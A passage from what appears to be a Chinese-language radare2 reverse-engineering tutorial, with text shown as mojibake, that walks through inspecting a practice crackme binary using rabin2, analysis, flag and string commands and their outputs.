æ—¶æƒ³è¦å¸è½½<code>radare2</code>ã€‚å¦‚æœè¦å¸è½½çš„è¯åªéœ€è¦æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> make uninstall</span><br><span class="line"><span class="meta">$</span> make purge</span><br></pre></td></tr></table></figure><h1 id="å¼€å§‹å­¦ä¹ "><a href="#å¼€å§‹å­¦ä¹ " class="headerlink" title="å¼€å§‹å­¦ä¹ "></a>å¼€å§‹å­¦ä¹ </h1><p>ä½ å¯ä»¥åœ¨<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1" target="_blank" rel="noopener">è¿™é‡Œ</a>ä¸‹è½½Crackmeã€‚</p><p>ç°åœ¨ä½ å·²ç»åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸Šä¸‹è½½äº†<code>radare2</code>å’Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹æ¢ç´¢<code>radare2</code>çš„åŸºç¡€ä½¿ç”¨ã€‚æˆ‘ä¼šåœ¨<a href="https://remnux.org/" target="_blank" rel="noopener">REMunx</a>ä¸Šè°ƒè¯•ï¼Œå¤§éƒ¨åˆ†çš„å‘½ä»¤å’Œè¯´æ˜è·Ÿ<code>Windows</code>æˆ–è€…å…¶ä»–ç³»ç»Ÿä¸Šæ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h2><p>å’Œå¤§éƒ¨åˆ†å‘½ä»¤è¡Œå·¥å…·ä¸€æ ·ï¼ŒæŸ¥çœ‹å¯é€‰å‚æ•°çš„æ–¹å¼æ˜¯æ‰§è¡Œ<code>-h</code>å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -h</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸æŠŠå®Œæ•´çš„è¾“å‡ºæ”¾ä¸Šæ¥ï¼Œè€Œæ˜¯æ”¾ä¸€äº›æˆ‘æ—¥å¸¸å·¥ä½œä¸­å¸¸ç”¨çš„å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]</span><br><span class="line">          [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=</span><br><span class="line">  </span><br><span class="line">-d: Debug the executable 'file' or running process 'pid'</span><br><span class="line">-A: Analyze executable at load time (xrefs, etc)</span><br><span class="line">-q: Quiet mode, exit after processing commands</span><br><span class="line">-w: Write mode enabled</span><br><span class="line">-L: List of supported IO plugins</span><br><span class="line">-i [file]: Interprets a r2 script</span><br><span class="line">-n: Bare load. Do not load executable info as the entrypoint</span><br><span class="line">-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')</span><br><span class="line">-p [prj]: Creates a project for the file being analyzed</span><br><span class="line">-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with</span><br></pre></td></tr></table></figure><h2 id="äºŒè¿›åˆ¶ä¿¡æ¯"><a href="#äºŒè¿›åˆ¶ä¿¡æ¯" class="headerlink" title="äºŒè¿›åˆ¶ä¿¡æ¯"></a>äºŒè¿›åˆ¶ä¿¡æ¯</h2><p>é¢å¯¹ä¸€ä¸ªæ–°çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ç¬¬ä¸€ä»¶æƒ³åšçš„äº‹å°±æ˜¯è·å–æ–‡ä»¶çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>r2</code>æ¡†æ¶ä¸­æœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€â€”â€”<code>rabin2</code>æ¥è·å–ä¿¡æ¯ã€‚</p><blockquote><ul><li><p><code>rabin2</code>å¯ä»¥ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è·å–ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŒºæ®µã€æ–‡ä»¶å¤´ã€å¯¼å…¥å¯¼å‡ºè¡¨ã€å­—ç¬¦ä¸²ã€å…¥å£ç‚¹ç­‰ç­‰ã€‚åŒæ—¶å…·æœ‰ä¸åŒçš„æ ¼å¼çš„è¾“å‡ºã€‚<code>rabin2</code>æ”¯æŒ<code>ELF</code>ã€<code>PE</code>ã€<code>Mach-O</code>ã€<code>Java CLASS</code>ç­‰æ–‡ä»¶ã€‚</p></li><li><p>ä½¿ç”¨<code>man rabin2</code>æŸ¥çœ‹æ›´å¤šçš„ä¿¡æ¯ã€‚</p></li></ul></blockquote><p>æˆ‘ä»¬æ‰§è¡Œ<code>rabin2</code>å¹¶ä½¿ç”¨å‚æ•°<code>-I</code>è¾“å‡ºäºŒè¿›åˆ¶ä¿¡æ¯ï¼Œä¾‹å¦‚æ“ä½œç³»ç»Ÿã€è¯­è¨€ã€å­—èŠ‚åºã€æ¡†æ¶ä»¥åŠä¿æŠ¤æŠ€æœ¯ï¼ˆæ¯”å¦‚<code>Canary</code>ã€<code>PIC</code>ã€<code>NX</code>ï¼‰ç­‰ç­‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> rabin2 -I megabeets_0x1</span><br><span class="line">havecode true</span><br><span class="line">pic      false</span><br><span class="line">canary   false</span><br><span class="line">nx       false</span><br><span class="line">crypto   false</span><br><span class="line">va       true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">bintype  elf</span><br><span class="line">class    ELF32</span><br><span class="line">lang     c</span><br><span class="line">arch     x86</span><br><span class="line">bits     32</span><br><span class="line">machine  Intel 80386</span><br><span class="line">os       linux</span><br><span class="line">minopsz  1</span><br><span class="line">maxopsz  16</span><br><span class="line">pcalign  0</span><br><span class="line">subsys   linux</span><br><span class="line">endian   little</span><br><span class="line">stripped false</span><br><span class="line">static   false</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">relocs   true</span><br><span class="line">rpath    NONE</span><br><span class="line">binsz    6220</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª32ä½elfæ–‡ä»¶ï¼Œæ²¡æœ‰ç¬¦å·è¡¨å¹¶ä¸”æ˜¯åŠ¨æ€é“¾æ¥ã€‚å®ƒæ²¡æœ‰ä»»ä½•æ¼æ´åˆ©ç”¨æŠ€æœ¯â€”â€”ä¸‹ä¸€ç¯‡æ–‡ç« æˆ‘ä»¬è®²å­¦ä¹ ä½¿ç”¨<code>radare2</code>æ¥å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚<br>è®©æˆ‘ä»¬è·‘ä¸€ä¸‹ç¨‹åºï¼Œçœ‹çœ‹å®ƒåšäº†ä»€ä¹ˆã€‚</p><blockquote><ul><li>æ³¨æ„ï¼šè™½ç„¶æˆ‘å¯ä»¥å‘ä½ ä¿è¯è¿™ä¸ªç¨‹åºæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯é€†å‘ä¸€ä¸ªæœªçŸ¥çš„ç¨‹åºæ—¶ï¼ŒåŠ¡å¿…åœ¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒä¸‹è¿è¡Œã€‚</li><li>ä¸è¿‡ä½ å¯ä»¥ç›¸ä¿¡æˆ‘ï¼Œå› ä¸ºç¨‹åºç¡®å®æ˜¯å®‰å…¨çš„ã€‚ğŸ˜›</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./megabeets_0x1</span><br><span class="line"> </span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> ./megabeets_0x1 abcdef</span><br><span class="line"> </span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Nop, Wrong argument.</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è·‘çš„æ—¶å€™ï¼Œè¾“å‡ºäº†<code>Nop, Wrong argument</code>ã€‚å‡è®¾æˆ‘ä»¬éœ€è¦æä¾›ä¸€ä¸ªå‚æ•°ï¼Œç¬¬äºŒæ¬¡è¾“å…¥<code>abcdef</code>ä½œä¸ºå‚æ•°ï¼Œä¾æ—§å¤±è´¥äº†ã€‚æ˜¾ç„¶éœ€è¦ç‰¹å®šçš„å­—ç¬¦ä¸²æ‰èƒ½ç»•è¿‡ã€‚</p><p>è®©æˆ‘ä»¬ç”¨<code>radare2</code>æ¥æµ‹è¯•ç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 ./megabeets_0x1</span><br><span class="line"> â€” Thank you for using radare2. Have a nice night!</span><br><span class="line"><span class="meta">[0x08048370]&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ª<code>radare2</code>çš„shellï¼Œè¿˜æœ‰ä¸€ä¸ªæ¬¢è¿ç•Œé¢ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>fo</code>æ¥è¾“å‡ºä¸€ä¸ªæ–°çš„å¥å­ï¼Œæœ‰äº›å¾ˆæç¬‘åŒæ—¶æœ‰äº›ä¹Ÿå¾ˆæœ‰è¶£ã€‚ç°åœ¨<code>r2</code>çš„shellæ­£åœ¨ç­‰ç€æˆ‘ä»¬è¾“å…¥å‘½ä»¤ï¼Œå¹¶ä¸”å±•ç¤ºç»™æˆ‘ä»¬æ­¤åˆ»æ‰€åœ¨çš„åœ°å€ï¼ˆ0x08048370ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬è‡ªåŠ¨åœ¨å…¥å£ç‚¹å¤„ã€‚è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æ­£ç¡®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>ie</code>å‘½ä»¤è¾“å‡ºäº†æ–‡ä»¶çš„å…¥å£ç‚¹åœ°å€ã€‚<code>r2</code>å‘½ä»¤æœ‰ä¸€ç³»åˆ—æœ‰æ„ä¹‰çš„å­—æ¯ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œ<code>ie</code>ä»£è¡¨äº†<code>info &gt;&gt; entrypoint</code>ã€‚å› æ­¤åœ¨ä½ ç†Ÿæ‚‰äº†<code>radare2</code>çš„èƒ½åŠ›ä¹‹åï¼Œå‘½ä»¤éƒ½æ˜¯æ¯”è¾ƒå¥½è®°çš„ã€‚ä½†æ˜¯ä½ ä¸éœ€è¦è®°ä½æ‰€æœ‰çš„å‘½ä»¤â€”â€”ä½ å¯ä»¥ä»…ä»…éœ€è¦åœ¨ï¼ˆå‡ ä¹ï¼‰æ¯ä¸ªå­—æ¯åé¢åŠ ä¸Š<code>?</code>æ¥è·å¾—å‘½ä»¤çš„ä¿¡æ¯ä»¥åŠå®ƒçš„å­å‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> i?</span><br><span class="line">|Usage: i Get info from opened file (see rabin2â€™s manpage)</span><br><span class="line">| Output mode:</span><br><span class="line">| â€˜*â€™                Output in radare commands</span><br><span class="line">| â€˜jâ€™                Output in json</span><br><span class="line">| â€˜qâ€™                Simple quiet output</span><br><span class="line">| Actions:</span><br><span class="line">| i|ij               Show info of current file (in JSON)</span><br><span class="line">| iA                 List archs</span><br><span class="line">| ia                 Show all info (imports, exports, sections..)</span><br><span class="line">| ib                 Reload the current buffer for setting of the bin (use once only)</span><br><span class="line">| ic                 List classes, methods and fields</span><br><span class="line">| iC                 Show signature info (entitlements, â€¦)</span><br><span class="line">| id                 Debug information (source lines)</span><br><span class="line">| iD lang sym        demangle symbolname for given language</span><br><span class="line">| ie                 Entrypoint</span><br><span class="line">| iE                 Exports (global symbols)</span><br><span class="line">| ih                 Headers (alias for iH)</span><br><span class="line">| iHH                Verbose Headers in raw text</span><br><span class="line">| ii                 Imports</span><br><span class="line">| iI                 Binary info</span><br><span class="line">| ik [query]         Key-value database from RBinObject</span><br><span class="line">| il                 Libraries</span><br><span class="line">| iL                 List all RBin plugins loaded</span><br><span class="line">| im                 Show info about predefined memory allocation</span><br><span class="line">| iM                 Show main address</span><br><span class="line">| io [file]          Load info from file (or last opened) use bin.baddr</span><br><span class="line">| ir|iR              Relocs</span><br><span class="line">| is                 Symbols</span><br><span class="line">| iS [entropy,sha1]  Sections (choose which hash algorithm to use)</span><br><span class="line">| iV                 Display file version info</span><br><span class="line">| iz                 Strings in data sections</span><br><span class="line">| izz                Search for Strings in the whole binary</span><br><span class="line">| iZ                 Guess size of binary program</span><br></pre></td></tr></table></figure><p><code>i</code>å‘½ä»¤ç›®çš„æ˜¯ä»æ‰“å¼€çš„æ–‡ä»¶ä¸­è·å–ä¿¡æ¯ï¼Œå®ƒå°±æ˜¯é›†æˆåˆ°<code>radare2</code>çš„shellé‡Œçš„<code>rabin2</code>ï¼ˆä¹‹å‰æåˆ°çš„ï¼‰ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é»˜è®¤æƒ…å†µä¸‹<code>radare2</code>ä¸ä¼šè‡ªåŠ¨åˆ†ææ–‡ä»¶ï¼Œå› ä¸ºåˆ†ææ–‡ä»¶æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œå°¤å…¶æ˜¯æ¯”è¾ƒå¤§çš„æ–‡ä»¶ã€‚äº†è§£æ›´å¤šå…³äºåˆ†æçš„å†…å®¹ï¼Œä½ å¯ä»¥çœ‹ä¸€çœ‹åœ¨<code>radare2</code>åšå®¢ä¸Šçš„<a href="http://radare.today/posts/analysis-by-default/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><p>æ˜¾ç„¶åˆ†æä»ç„¶æ˜¯å¯èƒ½çš„ï¼Œ<code>r2</code>æä¾›äº†è®¸å¤šç§ç±»çš„åˆ†ææ–¹å¼ã€‚æ­£å¦‚æˆ‘ä¹‹å‰æåˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹<code>a</code>å‘½ä»¤åé¢æ·»åŠ <code>?</code>æ¥æŸ¥æ‰¾åˆ†æé€‰é¡¹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">[0x08048370]&gt;</span> a?</span><br><span class="line">|Usage: a[abdefFghoprxstc] [â€¦]</span><br><span class="line">| ab [hexpairs]    analyze bytes</span><br><span class="line">| abb [len]        analyze N basic blocks in [len] (section.size by default)</span><br><span class="line">| aa[?]            analyze all (fcns + bbs) (aa0 to avoid sub renaming)</span><br><span class="line">| ac[?] [cycles]   analyze which op could be executed in [cycles]</span><br><span class="line">| ad[?]            analyze data trampoline (wip)</span><br><span class="line">| ad [from] [to]   analyze data pointers to (from-to)</span><br><span class="line">| ae[?] [expr]     analyze opcode eval expression (see ao)</span><br><span class="line">| af[?]            analyze Functions</span><br><span class="line">| aF               same as above, but using anal.depth=1</span><br><span class="line">| ag[?] [options]  output Graphviz code</span><br><span class="line">| ah[?]            analysis hints (force opcode size, â€¦)</span><br><span class="line">| ai [addr]        address information (show perms, stack, heap, â€¦)</span><br><span class="line">| ao[?] [len]      analyze Opcodes (or emulate it)</span><br><span class="line">| aO               Analyze N instructions in M bytes</span><br><span class="line">| ar[?]            like â€˜drâ€™ but for the esil vm. (registers)</span><br><span class="line">| ap               find prelude for current offset</span><br><span class="line">| ax[?]            manage refs/xrefs (see also afx?)</span><br><span class="line">| as[?] [num]      analyze syscall using dbg.reg</span><br><span class="line">| at[?] [.]        analyze execution traces</span><br><span class="line">Examples:</span><br><span class="line">f ts @ S*~text:0[3]; f t @ section..text</span><br><span class="line">f ds @ S*~data:0[3]; f d @ section..data</span><br><span class="line">.ad t t+ts @ d:ds</span><br></pre></td></tr></table></figure><p>æˆ‘é€šå¸¸å¼€å§‹åˆ†ææ—¶ä¼šæ‰§è¡Œ<code>aa</code>ï¼ˆ<code>analyse all</code>ï¼‰ã€‚è¿™ä¸ªåç§°æœ‰ä¸€ç‚¹å®¹æ˜“è¯¯è§£ï¼Œå› ä¸ºé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šå¯ä»¥åˆ†æçš„ï¼ˆæ‰§è¡Œ<code>aa?</code>å¯ä»¥çœ‹åˆ°æ›´å¤šçš„ç”¨æ³•ï¼‰ï¼Œä½†å¯¹äºè¿™ä¸ªç¨‹åºæ¥è¯´å·²ç»è¶³å¤Ÿäº†ã€‚è¿™æ¬¡æˆ‘ä»¬ç›´æ¥æ‰§è¡Œ<code>aaa</code>ï¼Œæ›´ç®€å•äº›ã€‚ä½ ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>radare2</code>ç”¨<code>-A</code>å‚æ•°æ¥åˆ†ææ–‡ä»¶ï¼Œç›´æ¥åœ¨å¼€å§‹å°±æ‰§è¡Œ<code>aaa</code>ï¼ˆä¾‹å¦‚<code>r2 -A megabeets_0x1</code>ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[*] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br></pre></td></tr></table></figure><h2 id="æ ‡å¿—"><a href="#æ ‡å¿—" class="headerlink" title="æ ‡å¿—"></a>æ ‡å¿—</h2><p>åœ¨åˆ†æä¹‹åï¼Œ<code>radare2</code>æŠŠä¸€äº›ç‰¹å®šçš„åå­—å’Œåç§»è”ç³»åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚åŒºæ®µã€å‡½æ•°ã€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²ç­‰ç­‰ã€‚ä»–ä»¬è¢«ç§°ä½œä¸ºæ ‡å¿—ã€‚æ ‡å¿—è¢«æ•´åˆè¿›æ ‡å¿—ç©ºé—´ï¼Œä¸€ä¸ªæ ‡å¿—ç©ºé—´æ˜¯æ‰€æœ‰ç±»ä¼¼ç‰¹å¾çš„æ ‡å¿—çš„é›†åˆã€‚æ‰§è¡Œ<code>fs</code>ä»¥æŸ¥çœ‹æ‰€æœ‰çš„æ ‡å¿—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs</span><br><span class="line">0    4 . strings</span><br><span class="line">1   35 . symbols</span><br><span class="line">2   82 . sections</span><br><span class="line">3    5 . relocs</span><br><span class="line">4    5 . imports</span><br><span class="line">5    1 . functions</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>fs &lt;flagspace&gt;</code>æ¥æŸ¥çœ‹æŸä¸ªç‰¹å®šçš„æ ‡å¿—ç©ºé—´ï¼Œç„¶åç”¨<code>f</code>è¾“å‡ºæ‰€æœ‰çš„æ ‡å¿—ã€‚æˆ‘ä»¬ä½¿ç”¨åˆ†å·å°†ä¸€è¡Œä¸­çš„å¤šä¸ªå‘½ä»¤åˆ†å¼€ï¼ˆæ¯”å¦‚<code>å‘½ä»¤ä¸€; å‘½ä»¤äºŒ; å‘½ä»¤ä¸‰;...</code>ï¼‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs imports; f</span><br><span class="line">0x08048320 6 sym.imp.strcmp</span><br><span class="line">0x08048330 6 sym.imp.strcpy</span><br><span class="line">0x08048340 6 sym.imp.puts</span><br><span class="line">0xffffffff 16 loc.imp.__gmon_start__</span><br><span class="line">0x08048350 6 sym.imp.__libc_start_main</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œ<code>radare2</code>å°†æ‰€æœ‰ç¨‹åºæ‰€ä½¿ç”¨çš„å¯¼å…¥è¡¨è¾“å‡ºâ€”â€”å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„<code>strcmp</code>ã€<code>strcpy</code>ã€<code>puts</code>ç­‰ï¼ŒåŒ…æ‹¬ç›¸å…³çš„åœ°å€ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ—å‡ºå­—ç¬¦ä¸²çš„æ ‡å¿—ç©ºé—´ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs strings; f</span><br><span class="line">0x08048700 21 str._n__.::_Megabeets_::.</span><br><span class="line">0x08048715 23 str.Think_you_can_make_it_</span><br><span class="line">0x0804872c 10 str.Success__n</span><br><span class="line">0x08048736 22 str.Nop__Wrong_argument._n</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><p>æˆ‘ä»¬çœ‹åˆ°<code>r2</code>åˆ—å‡ºäº†ä¸€äº›å­—ç¬¦ä¸²çš„åç§»ï¼Œè¿˜æœ‰ä¸€äº›å˜é‡åã€‚è®©æˆ‘ä»¬ä¸»è¦æ¥çœ‹çœ‹å­—ç¬¦ä¸²ã€‚æœ‰å¾ˆå¤šå¯ä»¥åˆ—å‡ºç¨‹åºä¸­å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½ å¯ä»¥é€‰æ‹©ä½ æœ€éœ€è¦çš„ä¸€ç§ã€‚<br><code>iz</code> â€“ åˆ—å‡ºåœ¨æ•°æ®çŸ­çš„å­—ç¬¦ä¸²<br><code>izz</code> â€“ åœ¨æ•´ä¸ªç¨‹åºä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> iz</span><br><span class="line">vaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\n .:: Megabeets ::.</span><br><span class="line">vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?</span><br><span class="line">vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\n</span><br><span class="line">vaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\n</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†å¤§éƒ¨åˆ†å­—ç¬¦ä¸²â€”â€”è¿˜è®°å¾—æˆ‘ä»¬ä¸€å¼€å§‹è¿è¡Œç¨‹åºæ—¶çš„é‚£å‡ è¡Œå­—ç¬¦ä¸²å§ã€‚ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰çœ‹åˆ°<code>Success</code>ï¼Œè¿™åº”è¯¥æ˜¯æˆ‘ä»¬è¾“å…¥æ­£ç¡®å­—ç¬¦ä¸²åçš„æç¤ºã€‚æ—¢ç„¶æˆ‘ä»¬å·²ç»å¾—åˆ°äº†å­—ç¬¦ä¸²ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å®ƒä»¬åœ¨ç¨‹åºçš„ä»€ä¹ˆåœ°æ–¹è¢«ä½¿ç”¨äº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> axt @@ str.*</span><br><span class="line">data 0x8048609 push str._n__.::_Megabeets_::. in main</span><br><span class="line">data 0x8048619 push str.Think_you_can_make_it_ in main</span><br><span class="line">data 0x8048646 push str._n_tSuccess__n in main</span><br><span class="line">data 0x8048658 push str._n_tNop__Wrong_argument._n in main</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å±•ç¤ºç»™æˆ‘ä»¬<code>radare2</code>æ›´å¤šçš„ç‰¹ç‚¹ã€‚<code>axt</code>å‘½ä»¤ç”¨æ¥åœ¨æ•°æ®æ®µæˆ–ç¨‹åºæ®µäº¤å‰æŸ¥æ‰¾æŸä¸ªåœ°å€ï¼ˆè¯•è¯•<code>ax?</code>ï¼‰ã€‚<code>@@</code>æ˜¯ä¸€ä¸ªè¿­ä»£å™¨æ ‡å¿—ï¼Œç”¨æ¥åœ¨ä¸€æ®µåç§»ä¸Šé‡å¤æŸä¸ªå‘½ä»¤ï¼ˆè¯•è¯•<code>@@?</code>ï¼‰ã€‚<code>str.*</code>æ˜¯ä¸€ä¸ªå¯¹æ‰€æœ‰å¼€å¤´ä¸º<code>str.</code>çš„æ ‡å¿—çš„é€šé…ã€‚è¿™æ¡å‘½ä»¤èƒ½å¸®åŠ©æˆ‘åˆ—å‡ºå­—ç¬¦ä¸²æ 